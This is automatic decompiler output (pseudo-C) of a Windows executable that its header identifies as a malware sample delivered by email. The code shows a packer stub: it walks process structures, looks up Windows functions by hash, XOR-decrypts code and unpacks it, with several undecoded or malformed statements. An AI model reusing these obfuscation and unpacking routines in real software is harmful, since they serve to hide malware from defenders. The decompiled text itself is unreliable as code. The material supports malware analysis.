/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1486/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401394 -> 0040142a */
/*	Procedure: 0x0040108F - 0x004013F6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    asm("rol edx,0x4");
    eax = -2102395812;
    asm("rol eax,0x5");
    asm("ror esi,0x15");
    edx = -112;
    ecx = ecx & ebp;
    esi = esp;
    edi = edi + edi;
    ecx = si & 65535;
    esi = ecx;
    ecx = 73728;
    asm("rol ecx,0x4");
    ecx = ecx + esi;
    asm("ror ax,0x7");
    edi = *ecx;
    cx = cx | 7;
L004010c6:
    edi = edi + 1;
    esi = ~esi;
    if(*%ss:edi] != edx) {
        asm("rol cx,0xc");
        if(*%ss:edi] != eax) {
            asm("Unknown opcode 0xc1");
            asm("int1");
            (restore)es;
            goto L004010c6;
        }
        edi = edi - 1;
        ecx = 9;
        asm("rol ecx,0x4");
        if(*edi == cl) {
        }
    } else {
        edi = edi + 4;
        ecx = 1020;
        asm("ror ecx,0x2");
        if(*edi != cl) {
            ecx = ecx ^ eax;
        }
    }
    ecx :: 0;
    eax = *esp;
    di = di - 82;
    ecx = eax;
L0040110c:
    ecx = ecx - 1;
    eax = 201326595;
    asm("rol eax,0x6");
    asm("ror dx,0x3");
    if(*%ss:ecx] != eax) {
        di = di | -74;
        goto L0040110c;
    }
    asm("Unknown opcode 0xc1");
    asm("lock add edi,edi");
    *(edx + 210546927) = *(edx + 210546927) >> 1;
    ecx = ecx >> 8;
    edx = edx + -210546879;
    eax = !eax;
    esi = *%fs:edx];
    edi = edi >> 9;
    eax = *(esi + 12);
    edi = edi ^ -1263140600;
    esi = 28;
    ecx = ecx + 1;
    eax = eax + 28;
    asm("ror edx,0x7");
    ecx = *eax;
    asm("rol eax,0x10");
    edx = *ecx;
    eax = eax + 1700040684;
    edi = *(edx + 8);
    esi = esi ^ edx;
    asm("rol ax,0x3");
    ecx = ecx + 1;
    eax = L00401448(edi, -800952333);
    eax = eax ^ ebp;
    edx = 1818504812;
    (save)108;
    edi = 32;
    (save)1818504812;
    asm("ror edx,0xc");
    esi = 1818522734;
    (save)1818522734;
    edi :: 0;
    (save)esp;
    eax = *ecx();
    esp = esp - -12;
    edx = ~edx;
    eax = L00401448(eax, -1922427646);
    edi = ecx;
    (save)0;
    (save)0;
    esi = 0;
    (save)0;
    (save)13695530;
    (save)-1791950905;
    (save)2452;
    eax = *edi();
    ecx = ecx - edi;
    ds = 2452;
    esi = !esi | 1824960879;
    edi = 1407750;
    asm("rol dx,0x6");
    ecx = *edi;
    esi = esi - 1;
    eax = *ecx();
    *edi = *edi & ch;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    eax = 35;
    di = di - 30;
    ds = 35;
    ecx = ecx + ebp;
    eax = 48;
    asm("ror edi,0x12");
    edx = edx ^ edi;
    ecx = 12;
    esi = *%fs:eax] + 12;
    eax = eax >> 27;
    edi = *esi;
    asm("rol edx,0x6");
    ecx = *(edi + 28);
    esi = esi | -1309439696;
    eax = *ecx;
    ecx = ecx + 1261902980;
    edi = edi + -1867766924;
    eax = eax + 8;
    edx = *eax;
    esi = ~L00000008 - edx;
    asm("ror edi,0x1");
    ebp = edx;
    eax = L00401448(edx, -81226101);
    (save)152080;
    eax = 64;
    (save)64;
    eax = *ecx();
    ebx = eax;
    *(eax - -151554) = ebp;
    eax = L00401448(ebp, -800952333);
    *(ebx - -151574) = ecx;
    L00401448(ebp, 1283859781);
    *(ebx - -151591) = ecx;
    eax = L00401448(ebp, 229258070);
    (save)esp - 113;
    edi = 64;
    (save)64;
    eax = 4194304;
    edi = *L0040003C + 4194304;
    (save) *(edi + 80);
    (save)4194304;
    eax = *ecx();
    edi = 0x40107f;
    esi = *L0040107F;
    eax = 0;
    asm("pushf");
    asm("popf");
    ecx = 47758;
    asm("pushf");
    asm("cmc");
    asm("popf");
    edi = 4194651 + esi;
    asm("pushf");
    asm("clc");
    asm("popf");
    al = *edi;
    if(eax != 0) {
        al = al ^ 201;
        if(eax != 0) {
            *edi = al;
        }
        asm("pushf");
        asm("cmc");
        asm("popf");
    }
    asm("pushf");
    asm("stc");
    asm("popf");
    edi = edi + 1;
    asm("pushf");
    asm("popf");
    asm("loop 0x4012dd");
    asm("pusha");
    asm("pushf");
    asm("wait");
    asm("popf");
    edi = ebx;
    eax = 0x40107f;
    asm("pushf");
    asm("cld");
    asm("popf");
    esi = *eax + 4194651;
    asm("cld");
    asm("pushf");
    asm("cmc");
    asm("popf");
    dl = 128;
    asm("pushf");
    asm("clc");
    asm("popf");
    ebx = 0;
L0040131d:
    *edi = *esi;
    edi = edi + 1;
    asm("pushf");
    asm("wait");
    asm("popf");
    bl = 2;
L00401323:
    L004013F7();
    if(esi = esi + 1) {
        goto L0040131d;
    }
    ecx = 0;
    L004013F7();
    >= ? L00401376 : ;
    eax = 0;
    eax = L004013F7();
    >= ? L00401390 : ;
    bl = 2;
    asm("pushf");
    asm("cmc");
    asm("popf");
    al = 16;
L00401350:
    eax = L004013F7();
    asm("pushf");
    asm("cld");
    asm("popf");
    asm("adc al,al");
    asm("fnop");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L00401350;
    }
    != ? 0x4013e7 : ;
    asm("fnop");
    asm("wait");
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    goto L00401323;
    eax = L0040140D();
    asm("pushf");
    asm("cld");
    asm("popf");
    if(!(ecx = ecx - ebx)) {
        L00401408();
        goto L004013e0;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L0040142a;
        }
        asm("adc ecx,ecx");
    } else {
        asm("xchg eax,ecx");
        eax = eax - 1 << 8;
        al = *esi;
        esi = esi + 1;
        eax = L00401408();
        asm("pushf");
        asm("popf");
        if(eax < 32000) {
            if(ah >= 5) {
                goto L004013d7;
            }
            asm("pushf");
            asm("stc");
            asm("popf");
            if(eax > 127) {
                goto L004013db;
            }
        }
    }
    asm("pushf");
    asm("popf");
    ecx = ecx + 1;
L004013d7:
    asm("pushf");
    asm("clc");
    asm("popf");
    ecx = ecx + 1;
L004013db:
    asm("pushf");
    asm("popf");
    asm("xchg ebp,eax");
L004013e0:
    eax = ebp;
    bl = 1;
    asm("pushf");
    asm("popf");
    (save)esi;
    esi = edi;
    asm("pushf");
    asm("clc");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    (restore)esi;
    goto L00401323;
}

/* DEST BLOCK NOT FOUND: 004013f9 -> 00401407 */
/*	Procedure: 0x004013F7 - 0x00401407
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013F7()
{



    if(!(dl = dl + dl)) {
        dl = *esi;
        asm("pushf");
        asm("stc");
        asm("popf");
        esi = esi + 1;
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x00401408 - 0x0040140C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401408()
{



    asm("pushf");
    asm("cmc");
    asm("popf");
    ecx = 0;
}

stack space not deallocated on return
/*	Procedure: 0x0040140D - 0x00401447
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040140D()
{



    asm("pushf");
    asm("cld");
    asm("popf");
    asm("pushf");
    asm("stc");
    asm("popf");
    do {
        L004013F7();
        asm("pushf");
        asm("popf");
        asm("adc ecx,ecx");
        eax = L004013F7();
    } while(ecx = ecx + 1);
    return;
    asm("popa");
    asm("pushf");
    asm("popf");
    eax = L00401505();
    esi = 0x40104a;
    (save)151552 + ebx;
    ecx = 31;
    asm("rep movsb");
}

/*	Procedure: 0x00401448 - 0x00401504
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 16
 */

L00401448(A14, A18)
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  eax;
	/* unknown */ void  edx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    edx = edx ^ A18;
    edi = A14;
    A18 = edi;
    edx = edx & ecx;
    edi = edi + 90 + -30;
    eax = eax + 1221608864;
    edx = *edi;
    eax = *(A18 + 116 + 4 + edx) - -20 - -8 + A18;
    ecx = *eax + A18;
    eax = eax + 4;
    edx = *eax + A18;
    (save) *(eax + 4) + A18;
    (save)ecx;
    ecx = edx;
    (save)0;
    edi = A14;
    eax = edi;
    edi = edi + *ecx;
    for(edx = 0; 1; edx = 0) {
        dl = dl + *edi;
        asm("ror edx,0x18");
        edi = edi + 1;
        edx = edx ^ -340281375;
        if(*edi != 0) {
            continue;
        }
        if((edx ^ A18) == 0) {
            break;
        }
        ecx = ecx - -4;
        edi = *ecx + eax;
        (restore)edx;
        (save)edx + 1;
    }
    (restore)A18;
    edi = Vfffffffc + (A18 << 1);
    edx = ( *edi & 65535) << 2;
    edi = *esp + edx;
    (restore)edx;
    ecx = *edi;
    (restore)A18;
    ecx = ecx + eax;
}

/*	Procedure: 0x00401505 - 0x00401600
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401505()
{



    asm("pusha");
    edx = ebx;
    edi = 78640 + edx;
    for(*(ebx + 151605) = edx; 1; edi = edi + 20) {
        esi = *(edi + 12);
        if(esi == 0) {
            break;
        }
        (save)edi;
        (save)esi;
        *(ebx + 151634) = *(edi - -16);
        eax = *edi;
        *(ebx + 151624) = eax;
        if(eax == 0) {
            eax = *(edi + 16);
        }
        edx = *(ebx + 151605);
        (restore)esi;
        eax = eax + edx;
        *(ebx + 151648) = eax;
        (save) *(ebx + 151648);
        (save)esi + edx;
        esi = *( *(ebx + 151574))();
        for(*(ebx + 151670) = esi; 1; *(ebx + 151648) = *(ebx + 151648) + 4) {
            eax = *(ebx + 151648);
            edi = *eax;
            if(edi == 0) {
                break;
            }
            if(!(edi & -2147483648)) {
                if(!(edi = edi - -2)) {
                    goto L0040158b;
                }
                edi = edi + *(ebx + 151605);
            } else {
L0040158b:
                edi = edi & 2147483647;
            }
            eax = *( *(ebx + 151591))( *(ebx + 151670), edi);
            edi = *(ebx + 151634);
            *(edi + *(ebx + 151605)) = eax;
            *(ebx + 151634) = *(ebx - -151634) + 4;
        }
        esp = esp - -4;
        (restore)edi;
    }
    asm("popa");
}

/*	Procedure: 0x00401601 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401601()
{



}

/* address  size  */
/* 0x0040108f       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
